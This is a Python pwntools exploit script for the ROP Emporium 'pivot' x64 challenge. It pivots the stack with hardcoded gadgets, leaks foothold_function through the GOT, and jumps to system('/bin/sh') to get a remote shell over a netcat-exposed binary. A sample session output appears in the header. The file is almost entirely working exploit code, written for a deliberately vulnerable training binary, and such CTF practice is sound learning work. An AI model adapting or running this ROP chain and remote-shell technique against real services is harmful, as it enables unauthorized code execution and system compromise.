#!/usr/bin/python2
##########################################################################
#   Title:          ROP Emporium "pivot" x64 exploit Remote Shell exploit
#   Author:         fckoo
#   Description:    This is an exploit for ROP Emporium's "pivot" x64 bit
#                   exploit challenge.  Instead of using the ROP chain to 
#                   /bin/cat the flag.txt, I used it to obtain a remote 
#                   shell on the system.
##########################################################################
#                       Victim
#   victim$ nc -lvp 5432 -e ./pivot
##########################################################################
#                       ATTACKER
#   attacker$ python2 ./pivot_exploit_rce.py 
#   [+] Opening connection to 127.0.0.1 on port 5432: Done
#   [+] You should now have a shell :)
#   [*] Switching to interactive mode
#    
#   Send your second chain now and it will land there
#   > Now kindly send your stack smash
#   > foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so$ 
#   $ ls
#   flag.txt
#   libpivot.so
#   pivot
#   $ cat ./flag.txt
#   ROPE{a_placeholder_32byte_flag!}
#   $ exit
##########################################################################
from pwn import *

OFFSET = 40 # offset to RIP overwrite

# Stage one: Pivots to a second, longer buffer
#            which has our main ROP chain to RCE
def stage_one(addr):
    # pop rax; ret
    pop_rax_ret = p64(0x0000000000400b00)

    # xchg rax, rsp; ret
    xchg_rax_rsp_ret = p64(0x0000000000400b02)

    # pivot stack
    rop  = ""
    rop += pop_rax_ret
    rop += p64(addr)  # rax
    rop += xchg_rax_rsp_ret 
    rop += "C" * 8

    return rop

# Stage two: get RCE
def stage_two(addr):
    offset_from_foothold_to_win = 345   # system() on ret2win

    # FOOTHOLD GOT and PLT
    FOOTHOLD_PLT = p64(0x400850)
    FOOTHOLD_GOT = p64(0x602048)

    # pop rax; ret
    pop_rax_ret = p64(0x0000000000400b00)

    # mov rax, qword ptr [rax]; ret;
    mov_rax_qwordptr_rax_ret = p64(0x0000000000400b05)

    # pop rbp; ret
    pop_rbp_ret = p64(0x0000000000400900)

    # Add rax, rbp; ret;
    add_rax_rbp_ret = p64(0x0000000000400b09)

    # jmp rax
    jmp_rax = p64(0x4008f5)

    # pop rdi; ret
    pop_rdi_ret = p64(0x0000000000400b73)

    # -------------------------------
    #  Begin ropchain
    # -------------------------------
    # Call foothold PLT to populate GOT
    rop  = ""
    rop += FOOTHOLD_PLT

    # Move address of foothold_function (@ GOT) to rax
    rop += pop_rax_ret
    rop += FOOTHOLD_GOT
    rop += mov_rax_qwordptr_rax_ret

    # Move offset from foothold to rbp
    rop += pop_rbp_ret
    rop += p64(offset_from_foothold_to_win)

    # move /bin/sh as first argument before jumping
    rop += pop_rdi_ret
    rop += p64(addr + 88)    # addr + 88 = address of /bin/sh

    # Add offset to rax and jmp to it
    rop += add_rax_rbp_ret
    rop += jmp_rax
    rop += "B" * 8
    rop += "/bin/sh\x00"    # Store /bin/sh to send pointer of it to rdi
    rop += "\n"

    return rop

def exploit(**kwargs):
    # DEBUG MODE, Only for testing under gdb
    if kwargs["debug"]:
        PIVOT_ADDR = 0x7ffff7bc4f10    # Only works under gdb

        # Stack mash + stack pivot
        p  = ""
        p += stage_two(PIVOT_ADDR)
        p += "A" * OFFSET
        p += stage_one(PIVOT_ADDR)

        log.info("Opening payload file")
        f = open("payload", "wb")
        f.write(p)
        f.close()
        log.success("Done")
    else:
        # Real exploit
        target = kwargs["host"]
        port = kwargs["port"]
        
        r = remote(target, port)
        r.recvuntil("The Old Gods kindly bestow upon you a place to pivot: 0x")
        leak = r.recv(12)
        leak = int(leak, 16)    # convert to hex number

        # Stack mash + stack pivot
        p  = ""
        p += stage_two(leak)
        p += "A" * OFFSET
        p += stage_one(leak)

        # Send exploit
        r.send(p)
        log.success("You should now have a shell :)")
        r.interactive()

if __name__ == "__main__":
    exploit(debug=False, host="127.0.0.1", port=int(5432))
